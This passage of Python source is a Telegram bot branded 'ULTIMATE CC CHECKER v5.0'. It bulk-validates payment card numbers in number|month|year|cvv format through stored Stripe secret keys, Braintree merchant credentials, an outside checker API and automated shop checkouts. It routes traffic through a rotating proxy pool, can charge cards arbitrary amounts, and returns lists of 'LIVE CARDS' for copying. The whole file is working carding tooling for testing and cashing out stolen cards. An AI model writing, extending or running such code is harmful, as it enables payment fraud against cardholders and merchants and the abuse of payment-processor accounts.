            bot.reply_to(message, copyable_text, parse_mode='Markdown')
            
    except Exception as e:
        bot.reply_to(message, f"❌ Stripe Bulk failed: {str(e)}")

@bot.message_handler(commands=['charge'])
def custom_charge(message):
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ **Usage:** `/charge card amount [currency]`\nExample: `/charge card 5.00 inr`", parse_mode='Markdown')
            return
            
        cc_data = parse_cc(parts[1])
        amount_val = float(parts[2])
        currency = parts[3].lower() if len(parts) > 3 else "usd"
        
        if not cc_data:
            bot.reply_to(message, "❌ Invalid card format!")
            return

        sk = get_sk_key()
        if not sk:
            bot.reply_to(message, "❌ No SK keys loaded!")
            return

        bot.reply_to(message, f"💵 **Charging:** `{cc_data}` | **{currency.upper()} {amount_val:.2f}**", parse_mode='Markdown')
        
        # Stripe Charge
        result = check_cc_stripe(cc_data, sk, int(amount_val * 100), currency)
        bot.reply_to(message, f"**{cc_data}**\n{result}", parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** {str(e)}")

# PROXY COMMANDS
@bot.message_handler(commands=['addproxy'])
def add_proxy(message):
    try:
        proxy = message.text.split(maxsplit=1)[1].strip()
        if proxy in PROXY_POOL:
            bot.reply_to(message, f"ℹ️ {proxy} already exists!")
            return

        bot.reply_to(message, f"🧪 **Testing:** `{proxy}`")
        if test_proxy(proxy):
            PROXY_POOL.append(proxy)
            save_proxies()
            bot.reply_to(message, f"✅ **ADDED!** `{proxy}`\n**Total:** {len(PROXY_POOL)}", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ **DEAD:** `{proxy}`")
    except:
        bot.reply_to(message, "❌ **Usage:** `/addproxy host:port:user:pass`")

@bot.message_handler(commands=['delproxy'])
def del_proxy(message):
    try:
        proxy = message.text.split(maxsplit=1)[1].strip()
        if proxy in PROXY_POOL:
            PROXY_POOL.remove(proxy)
            save_proxies()
            bot.reply_to(message, f"✅ REMOVED: {proxy}\nLeft: {len(PROXY_POOL)}", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ {proxy} not found!")
    except:
        bot.reply_to(message, "❌ Usage: /delproxy host:port:user:pass")

@bot.message_handler(commands=['proxylist'])
def list_proxies(message):
    if not PROXY_POOL:
        bot.reply_to(message, "📭 No proxies")
        return
    output = f"🔗 PROXIES ({len(PROXY_POOL)}):\n\n"
    for i, proxy in enumerate(PROXY_POOL[:25], 1):
        output += f"{i:2d}. {proxy}\n"
    if len(PROXY_POOL) > 25:
        output += f"\n... +{len(PROXY_POOL)-25} more"
    bot.reply_to(message, output, parse_mode='Markdown')

# STRIPE SK COMMANDS
def validate_sk_key(sk):
    """Comprehensive SK key validation"""
    results = {
        'valid': False,
        'format_valid': False,
        'account_valid': False,
        'card_capable': False,
        'key_type': None,
        'account_type': None,
        'errors': [],
        'warnings': []
    }
    
    # 1. Format Validation
    if not sk.startswith(('sk_live_', 'sk_test_')):
        results['errors'].append("Invalid format (must start with sk_live_ or sk_test_)")
        return results
    
    results['format_valid'] = True
    results['key_type'] = 'live' if sk.startswith('sk_live_') else 'test'
    
    try:
        stripe.api_key = sk
        
        # 2. Account Retrieval & Status
        try:
            account = stripe.Account.retrieve()
            results['account_valid'] = True
            results['account_type'] = account.get('type', 'standard')
            
            # Check if account is restricted
            if account.get('charges_enabled', False) == False:
                results['warnings'].append("Charges not enabled on account")
            if account.get('payouts_enabled', False) == False:
                results['warnings'].append("Payouts not enabled on account")
                
        except stripe.error.AuthenticationError:
            results['errors'].append("Authentication failed (invalid key)")
            return results
        except stripe.error.PermissionError:
            results['errors'].append("Permission denied")
            return results
        except stripe.error.APIError as e:
            results['errors'].append(f"API Error: {str(e)[:50]}")
            return results
        
        # 3. Card Data Capability Test
        try:
            # Use Stripe test card number for validation
            stripe.Token.create(
                card={
                    "number": "4242424242424242",
                    "exp_month": 12,
                    "exp_year": 2025,
                    "cvc": "123"
                },
                timeout=5
            )
            results['card_capable'] = True
        except stripe.error.InvalidRequestError as e:
            if "generally unsafe" in str(e).lower():
                results['warnings'].append("Key cannot handle raw card data (restricted)")
            else:
                results['warnings'].append(f"Card test failed: {str(e)[:50]}")
        except Exception as e:
            results['warnings'].append(f"Card capability test error: {str(e)[:50]}")
        
        # If we got here with account valid, key is usable
        if results['account_valid']:
            results['valid'] = True
            
    except Exception as e:
        results['errors'].append(f"Unexpected error: {str(e)[:50]}")
    
    return results

@bot.message_handler(commands=['addsk'])
def add_sk(message):
    try:
        sk = message.text.split(maxsplit=1)[1].strip()
        if sk in SK_KEYS:
            bot.reply_to(message, f"ℹ️ SK already exists!")
            return

        bot.reply_to(message, f"🧪 **Validating SK:** `{sk[:15]}...`")
        
        validation = validate_sk_key(sk)
        
        if not validation['valid']:
            error_msg = "❌ **SK VALIDATION FAILED:**\n"
            if validation['errors']:
                error_msg += "\n".join([f"• {e}" for e in validation['errors']])
            else:
                error_msg += "• Unknown validation error"
            bot.reply_to(message, error_msg, parse_mode='Markdown')
            return
        
        # Key is valid, add it
        SK_KEYS.append(sk)
        save_sk_keys()
        
        # Build success message with details
        success_msg = f"✅ **SK ADDED!**\n\n"
        success_msg += f"**Type:** {validation['key_type'].upper()}\n"
        success_msg += f"**Account:** {validation['account_type'].upper()}\n"
        
        if validation['card_capable']:
            success_msg += f"**Card Data:** ✅ Capable\n"
        else:
            success_msg += f"**Card Data:** ⚠️ Restricted\n"
        
        if validation['warnings']:
            success_msg += f"\n⚠️ **Warnings:**\n"
            success_msg += "\n".join([f"• {w}" for w in validation['warnings']])
        
        success_msg += f"\n**Total Keys:** {len(SK_KEYS)}"
        bot.reply_to(message, success_msg, parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** {str(e)}")

def test_single_sk(sk):
    """Test SK key capabilities with detailed status"""
    try:
        validation = validate_sk_key(sk)
        
        if not validation['valid']:
            if validation['errors']:
                error = validation['errors'][0][:40]
                return sk, f"🔴 **INVALID** ({error}...)"
            return sk, "🔴 **INVALID**"
        
        # Build status message
        status_parts = []
        
        # Key type
        key_type_emoji = "🟢" if validation['key_type'] == 'live' else "🟡"
        status_parts.append(f"{key_type_emoji} {validation['key_type'].upper()}")
        
        # Card capability
        if validation['card_capable']:
            status_parts.append("🟢 Card Data OK")
        else:
            status_parts.append("🟡 Card Restricted")
        
        # Account status
        if validation['account_type']:
            status_parts.append(f"📊 {validation['account_type'].upper()}")
        
        # Warnings
        if validation['warnings']:
            warning_count = len(validation['warnings'])
            status_parts.append(f"⚠️ {warning_count} warning(s)")
        
        status = " | ".join(status_parts)
        return sk, status
        
    except Exception as e:
        return sk, f"🔴 **ERROR** ({str(e)[:30]}...)"

@bot.message_handler(commands=['testsk'])
def test_sk_capabilities(message):
    if not SK_KEYS:
        bot.reply_to(message, "📭 No SK keys to test.")
        return
    
    bot.reply_to(message, f"🧪 **Testing {len(SK_KEYS)} SK keys in parallel...**")
    
    results = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_sk = {executor.submit(test_single_sk, sk): sk for sk in SK_KEYS}
        for future in as_completed(future_to_sk):
            results.append(future.result())
    
    results.sort(key=lambda x: SK_KEYS.index(x[0]))
    
    output = "🔑 **SK CAPABILITY REPORT:**\n\n"
    for i, (sk, status) in enumerate(results, 1):
        output += f"{i:2d}. `{sk[:15]}...` - {status}\n"
    
    bot.reply_to(message, output, parse_mode='Markdown')

@bot.message_handler(commands=['delsk'])
def del_sk(message):
    try:
        sk = message.text.split(maxsplit=1)[1].strip()
        if sk in SK_KEYS:
            SK_KEYS.remove(sk)
            save_sk_keys()
            bot.reply_to(message, f"✅ **SK REMOVED!**\n**Left:** {len(SK_KEYS)}", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ SK not found!")
    except:
        bot.reply_to(message, "❌ Usage: /delsk sk_live_...")

@bot.message_handler(commands=['sklist'])
def list_sk(message):
    if not SK_KEYS:
        bot.reply_to(message, "📭 No SK keys")
        return
    output = f"🔑 **STRIPE SK KEYS** ({len(SK_KEYS)}):\n\n"
    for i, sk in enumerate(SK_KEYS, 1):
        output += f"{i:2d}. `{sk[:15]}...`\n"
    bot.reply_to(message, output, parse_mode='Markdown')

# BRAINTREE COMMANDS
@bot.message_handler(commands=['btcheck'])
def bt_check(message):
    """Check card using Braintree"""
    try:
        if not check_rate_limit(message.from_user.id):
            remaining = get_rate_limit_status(message.from_user.id)
            bot.reply_to(message, f"⏱️ **Rate Limit Exceeded!**\n\nYou can check {remaining} more cards in the next minute.", parse_mode='Markdown')
            return
        
        cc_raw = message.text.split(maxsplit=1)[1].strip()
        cc_data = parse_cc(cc_raw)
        if not cc_data:
            bot.reply_to(message, "❌ Format: 4111111111111111|12|25|123", parse_mode='Markdown')
            return

        merchant_id, public_key, private_key = get_bt_credentials()
        if not merchant_id or not public_key or not private_key:
            bot.reply_to(message, "❌ No Braintree credentials loaded! Use /addbt first.", parse_mode='Markdown')
            return

        bot.reply_to(message, f"💳 **Braintree Checking:** `{cc_data}`", parse_mode='Markdown')
        result = check_cc_braintree(cc_data, merchant_id, public_key, private_key)
        status = 'live' if 'LIVE' in result else 'dead' if 'DEAD' in result else 'unknown'
        record_check(cc_data, status, 'BRAINTREE', message.from_user.id)
        bot.reply_to(message, f"**{cc_data}**\n{result}", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** {str(e)}")

@bot.message_handler(commands=['addbt'])
def add_bt(message):
    """Add Braintree credentials"""
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "❌ **Usage:** `/addbt merchant_id|public_key|private_key`\n\n**Example:**\n`/addbt abc123|pub_xyz|priv_abc`", parse_mode='Markdown')
            return
        
        cred_str = parts[1].strip()
        cred_parts = cred_str.split('|')
        
        if len(cred_parts) != 3:
            bot.reply_to(message, "❌ **Invalid format!**\n\nUse: `merchant_id|public_key|private_key`", parse_mode='Markdown')
            return
        
        merchant_id, public_key, private_key = cred_parts
        
        if cred_str in BT_CREDENTIALS:
            bot.reply_to(message, "ℹ️ These credentials already exist!")
            return

        bot.reply_to(message, f"🧪 **Testing Braintree credentials:** `{merchant_id[:8]}...`")
        
        # Test with a test card
        test_result = check_cc_braintree("4111111111111111|12|25|123", merchant_id, public_key, private_key, 1.00)
        
        if "ERROR" in test_result and "HTTP" not in test_result:
            # If it's not an HTTP error, credentials might be valid
            BT_CREDENTIALS.append(cred_str)
            save_bt_credentials()
            bot.reply_to(message, f"✅ **BRAINTREE CREDENTIALS ADDED!**\n\n**Merchant ID:** `{merchant_id[:8]}...`\n**Total:** {len(BT_CREDENTIALS)}", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"⚠️ **Added with warning:**\n{test_result}\n\nCredentials saved but may need verification.", parse_mode='Markdown')
            BT_CREDENTIALS.append(cred_str)
            save_bt_credentials()
        
    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** {str(e)}")

@bot.message_handler(commands=['btlist'])
def list_bt(message):
    """List Braintree credentials"""
    if not BT_CREDENTIALS:
        bot.reply_to(message, "📭 No Braintree credentials")
        return
    output = f"💳 **BRAINTREE CREDENTIALS** ({len(BT_CREDENTIALS)}):\n\n"
    for i, cred in enumerate(BT_CREDENTIALS, 1):
        parts = cred.split('|')
        merchant_id = parts[0] if parts else "Unknown"
        output += f"{i:2d}. `{merchant_id[:12]}...`\n"
    bot.reply_to(message, output, parse_mode='Markdown')

@bot.message_handler(commands=['delbt'])
def del_bt(message):
    """Delete Braintree credentials"""
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "❌ **Usage:** `/delbt merchant_id|public_key|private_key`", parse_mode='Markdown')
            return
        
        cred_str = parts[1].strip()
        if cred_str in BT_CREDENTIALS:
            BT_CREDENTIALS.remove(cred_str)
            save_bt_credentials()
            bot.reply_to(message, f"✅ **BRAINTREE CREDENTIALS REMOVED!**\n**Left:** {len(BT_CREDENTIALS)}", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Credentials not found!")
    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** {str(e)}")

@bot.message_handler(commands=['multicheck', 'multi'])
def multi_check(message):
    """Check card with all available APIs in parallel"""
    try:
        if not check_rate_limit(message.from_user.id):
            remaining = get_rate_limit_status(message.from_user.id)
            bot.reply_to(message, f"⏱️ **Rate Limit Exceeded!**\n\nYou can check {remaining} more cards in the next minute.", parse_mode='Markdown')
            return
        
        cc_raw = message.text.split(maxsplit=1)[1].strip()
        cc_data = parse_cc(cc_raw)
        if not cc_data:
            bot.reply_to(message, "❌ Format: 4111111111111111|12|25|123", parse_mode='Markdown')
            return

        proxy = get_proxy()
        proxy_text = " | **Proxy:** ON" if proxy else " | **Direct**"
        bot.reply_to(message, f"🔄 **Multi-API Check:** `{cc_data}`{proxy_text}", parse_mode='Markdown')
        
        result = check_multi_api(cc_data, proxy)
        bot.reply_to(message, f"**{cc_data}**\n\n{result}", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** {str(e)}")

@bot.message_handler(commands=['stats', 'statistics'])
def show_stats(message):
    """Show bot statistics"""
    try:
        total = STATS.get('total_checks', 0)
        live = STATS.get('live_count', 0)
        dead = STATS.get('dead_count', 0)
        errors = STATS.get('error_count', 0)
        bulk = STATS.get('bulk_checks', 0)
        last_check = STATS.get('last_check', 'Never')
        
        if total > 0:
            live_rate = (live / total) * 100
            dead_rate = (dead / total) * 100
        else:
            live_rate = dead_rate = 0
        
        stats_text = f"""📊 **BOT STATISTICS**

**Total Checks:** {total:,}
✅ **Live:** {live:,} ({live_rate:.1f}%)
❌ **Dead:** {dead:,} ({dead_rate:.1f}%)
⚠️ **Errors:** {errors:,}
📦 **Bulk Checks:** {bulk:,}

**Last Check:** {last_check[:19] if last_check else 'Never'}

**Current Status:**
🔌 Proxies: {len(PROXY_POOL)}
🔑 SK Keys: {len(SK_KEYS)}
🛠 Debug: {'ON' if DEBUG_MODE else 'OFF'}
"""
        bot.reply_to(message, stats_text, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['recent', 'history'])
def show_history(message):
    """Show recent check history"""
    try:
        if not CHECK_HISTORY:
            bot.reply_to(message, "📭 No check history available yet.")
            return
        
        # Get last 10 checks
        recent = list(CHECK_HISTORY)[-10:]
        recent.reverse()
        
        history_text = "📜 **RECENT CHECKS** (Last 10)\n\n"
        for i, check in enumerate(recent, 1):
            status_emoji = "✅" if check['status'] == 'live' else "❌" if check['status'] == 'dead' else "⚠️"
            timestamp = check.get('timestamp', '')[:16] if check.get('timestamp') else 'Unknown'
            method = check.get('method', 'Unknown')
            history_text += f"{i}. {status_emoji} `{check['cc']}` | {method} | {timestamp}\n"
        
        bot.reply_to(message, history_text, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['export'])
def export_valid_cards(message):
    """Export valid cards from last bulk check"""
    try:
        # Get recent live cards from history
        recent_live = [c for c in CHECK_HISTORY if c.get('status') == 'live'][-50:]  # Last 50 live
        
        if not recent_live:
            bot.reply_to(message, "📭 No valid cards found in recent history.\n\nRun a bulk check first to generate exportable cards.")
            return
        
        # Format for export
        export_text = "📋 **EXPORT - VALID CARDS**\n\n```\n"
        # Note: We only store BIN in history, so we can't export full cards
        # This would need to be improved to store full cards temporarily
        export_text += f"Found {len(recent_live)} recent live cards (BINs only)\n"
        export_text += "Note: Full card export requires storing cards temporarily\n"
        export_text += "```"
        
        bot.reply_to(message, export_text, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['status'])
def status(message):
    proxy_count = len(PROXY_POOL)
    sk_count = len(SK_KEYS)
    remaining = get_rate_limit_status(message.from_user.id)
    bot.reply_to(message, f"""
✅ v5.0 ONLINE
🔗 API: CHKR.CC (api.chkr.cc)
⚡️ Stripe SK: ENABLED
🛒 Auto-Shop: ENABLED
🔌 Proxies: {proxy_count}
🔑 SK Keys: {sk_count}
⏱️ Your Rate Limit: {remaining}/{MAX_CHECKS_PER_MINUTE}
🛠 Debug Mode: {'ON' if DEBUG_MODE else 'OFF'}
📊 Total Checks: {STATS.get('total_checks', 0):,}
""", parse_mode='Markdown')

@bot.message_handler(commands=['debug'])
def toggle_debug(message):
    global DEBUG_MODE
    DEBUG_MODE = not DEBUG_MODE
    bot.reply_to(message, f"🛠 **Debug Mode:** {'ON' if DEBUG_MODE else 'OFF'}")

@bot.message_handler(commands=['clear'])
def clear_chat(message):
    bot.reply_to(message, "🧹 Cleared!")

# Document Handler - Direct file processing
@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Handle uploaded or forwarded .txt files directly"""
    try:
        # Check if it's a text file
        if not message.document.file_name.endswith(('.txt', '.text')):
            bot.reply_to(message, "❌ Only .txt files are supported!")
            return
        
        # Extract file content
        file_content, error = extract_text_from_file(message)
        
        if error:
            bot.reply_to(message, error)
            return
        
        if not file_content:
            bot.reply_to(message, "❌ Could not read file content!")
            return
        
        # Parse cards
        cc_raw_list = [line.strip() for line in file_content.split('\n') if line.strip()]
        cc_list = [parse_cc(cc) for cc in cc_raw_list[:100] if parse_cc(cc)]
        
        if not cc_list:
            bot.reply_to(message, "❌ No valid cards found in file!")
            return
        
        # Store file_id for later retrieval
        file_id = message.document.file_id
        
        # Ask user which check method to use
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(
            types.InlineKeyboardButton("✅ CHKR.CC Check", callback_data=f"bulk_file_chkr_{file_id}"),
            types.InlineKeyboardButton("⚡️ Stripe SK Check", callback_data=f"bulk_file_stripe_{file_id}")
        )
        
        bot.reply_to(
            message,
            f"📄 **File detected:** `{message.document.file_name}`\n"
            f"📊 **Found {len(cc_list)} valid cards**\n\n"
            f"Choose check method:",
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error processing file: {str(e)}")

# Callback handler for file check selection
@bot.callback_query_handler(func=lambda call: call.data.startswith('bulk_file_'))
def handle_file_check_callback(call):
    try:
        bot.answer_callback_query(call.id, "Processing...")
        
        # Extract file_id from callback data
        parts = call.data.split('_', 3)
        if len(parts) < 4:
            bot.edit_message_text("❌ Invalid request!", call.message.chat.id, call.message.message_id)
            return
        
        check_type = parts[2]  # 'chkr' or 'stripe'
        file_id = parts[3]
        
        # Download file using file_id
        try:
            file_info = bot.get_file(file_id)
            file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
            response = requests.get(file_url, timeout=30)
            
            if response.status_code != 200:
                bot.edit_message_text(f"❌ Failed to download file (HTTP {response.status_code})", call.message.chat.id, call.message.message_id)
                return
            
            # Decode content
            try:
                file_content = response.text
            except:
                file_content = response.content.decode('utf-8', errors='ignore')
            
        except Exception as e:
            bot.edit_message_text(f"❌ Error downloading file: {str(e)}", call.message.chat.id, call.message.message_id)
            return
        
        # Parse cards
        cc_raw_list = [line.strip() for line in file_content.split('\n') if line.strip()]
        cc_list = [parse_cc(cc) for cc in cc_raw_list[:100] if parse_cc(cc)]
        
        if not cc_list:
            bot.edit_message_text("❌ No valid cards found!", call.message.chat.id, call.message.message_id)
            return
        
        # Process based on check type
        if check_type == 'chkr':
            # CHKR.CC check
            proxy = get_proxy()
            proxy_text = " | Proxy: ON" if proxy else " | Direct"
            bot.edit_message_text(f"⚡️ **Bulk: {len(cc_list)} cards**{proxy_text}", call.message.chat.id, call.message.message_id)
            
            results, stats = bulk_check_ultimate(cc_list, proxy)
            
            output = f"📊 **RESULTS** ({len(cc_list)} total):\n\n"
            lives = []
            valid_cards = []
            for i, result in enumerate(results, 1):
                card_short = cc_list[i-1].split('|')[0][:19] + "..."
                status = "💎" if "HIGH LIMIT" in result else "✅" if "LIVE" in result else "❌"
                output += f"{i:2d}. {status} `{card_short}`\n"
                if "LIVE" in result:
                    lives.append(result)
                    valid_cards.append(cc_list[i-1])
            
            output += f"\n**STATS:** 💎{stats['high_balance']} {stats['live']}✅ {stats['dead']}❌"
            bot.send_message(call.message.chat.id, output, parse_mode='Markdown')
            
            if lives:
                lives_text = "**🎯 LIVE CARDS:**\n" + "\n\n".join(lives[:5])
                bot.send_message(call.message.chat.id, lives_text, parse_mode='Markdown')
            
            if valid_cards:
                copyable_text = "📋 **COPY VALID CARDS:**\n\n```\n"
                copyable_text += "\n".join(valid_cards)
                copyable_text += "\n```"
                bot.send_message(call.message.chat.id, copyable_text, parse_mode='Markdown')
        
        elif check_type == 'stripe':
            # Stripe SK check
            if not SK_KEYS:
                bot.edit_message_text("❌ No Stripe SK keys loaded! Use /addsk first.", call.message.chat.id, call.message.message_id)
                return
            
            bot.edit_message_text(f"⚡️ **Stripe Bulk: {len(cc_list)} cards**", call.message.chat.id, call.message.message_id)
            
            results, stats = bulk_check_ultimate(cc_list, use_stripe=True)
            
            output = f"📊 **STRIPE RESULTS** ({len(cc_list)} total):\n\n"
            lives = []
            valid_cards = []
            for i, result in enumerate(results, 1):
                card_short = cc_list[i-1].split('|')[0][:19] + "..."
                status = "✅" if "LIVE" in result else "❌"
                output += f"{i:2d}. {status} `{card_short}`\n"
                if "LIVE" in result:
                    lives.append(result)
                    valid_cards.append(cc_list[i-1])
            
            output += f"\n**STATS:** {stats['live']}✅ {stats['dead']}❌"
            bot.send_message(call.message.chat.id, output, parse_mode='Markdown')
            
            if lives:
                lives_text = "**🎯 LIVE CARDS:**\n" + "\n\n".join(lives[:5])
                bot.send_message(call.message.chat.id, lives_text, parse_mode='Markdown')
            
            if valid_cards:
                copyable_text = "📋 **COPY VALID CARDS:**\n\n```\n"
                copyable_text += "\n".join(valid_cards)
                copyable_text += "\n```"
                bot.send_message(call.message.chat.id, copyable_text, parse_mode='Markdown')
        
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ Error: {str(e)}")

# URL pattern detection
def extract_url(text):
    """Extract URL from text"""
    url_pattern = r'(https?://[^\s]+|www\.[^\s]+|[a-zA-Z0-9-]+\.[a-zA-Z]{2,}[^\s]*)'
    matches = re.findall(url_pattern, text)
    if matches:
        url = matches[0]
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url
    return None

# Auto-detect CC with URL (for auto-shop check)
@bot.message_handler(func=lambda m: m.text and ('|' in m.text or re.search(r'\d{4}\s+\d{4}', m.text)))
def auto_check(message):
    text = message.text
    cc_data = parse_cc(text)
    
    if cc_data:
        # Check if there's a URL in the message
        url = extract_url(text)
        
        if url:
            # Auto-shop check
            proxy = get_proxy()
            proxy_text = " | **Proxy:** ON" if proxy else " | **Direct**"
            bot.reply_to(message, f"🛒 **Auto-Shop:** `{cc_data}`\n🌐 **Site:** {url}{proxy_text}", parse_mode='Markdown')
            result = check_cc_autosh(cc_data, url, proxy)
            bot.reply_to(message, f"**{cc_data}**\n{result}", parse_mode='Markdown')
        else:
            # Regular check
            proxy = get_proxy()
            result = check_cc_ultimate(cc_data, proxy)
            bot.reply_to(message, f"{cc_data}\n{result}", parse_mode='Markdown')

if __name__ == "__main__":
    print("=" * 50)
    print("🔥 ULTIMATE CC CHECKER v5.0 - ENHANCED 🔥")
    print("=" * 50)
    print(f"✅ API: {CHKR_API}")
    print(f"✅ Auto-Shop API: {AUTOSH_API}")
    print(f"✅ Proxies loaded: {len(PROXY_POOL)}")
    print(f"✅ SK Keys loaded: {len(SK_KEYS)}")
    print(f"✅ Braintree credentials: {len(BT_CREDENTIALS)}")
    print(f"✅ Statistics: {STATS.get('total_checks', 0)} total checks")
    print(f"✅ Rate Limit: {MAX_CHECKS_PER_MINUTE} checks/minute")
    print("=" * 50)
    print("🚀 Bot is starting...")
    print("=" * 50)
    
    # Save stats on startup
    save_stats()
    save_history()
    
    # For Render/cloud deployment - use non_stop polling
    try:
        print("✅ Starting bot polling...")
        bot.polling(none_stop=True, interval=0, timeout=20)
    except KeyboardInterrupt:
        print("\n⚠️ Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")
        print("🔄 Restarting in 5 seconds...")
        time.sleep(5)
        # Restart on error (for cloud deployment)
        bot.polling(none_stop=True, interval=0, timeout=20)